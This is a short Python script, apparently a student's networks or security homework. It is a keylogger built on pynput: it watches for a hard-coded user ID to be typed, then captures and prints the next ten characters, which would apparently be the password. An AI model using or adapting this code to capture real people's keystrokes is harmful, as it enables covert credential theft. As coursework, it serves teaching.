# Yannie Wu, ylw4sj
# CS 3710 Homework: Networks
from pynput import keyboard
from string import punctuation

userid = 'mst3k'
next10 = ''
userinput = ''


def on_press(key):
	global userid
	global next10
	global userinput

	try:
		#print('alphanumeric key {0} pressed'.format(key.char))
		if userinput != userid:
			userinput += key.char
		else:
			if key.char.isalpha() or key.char.isnumeric() or (key.char in punctuation):
				next10 += key.char
			if len(next10) == 10:
				print(next10)
	except AttributeError:
		pass
		#print('special key {0} pressed'.format(key))

def on_release(key):
    #print('{0} released'.format(key))
	if key == keyboard.Key.esc:
        # Stop listener
		return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()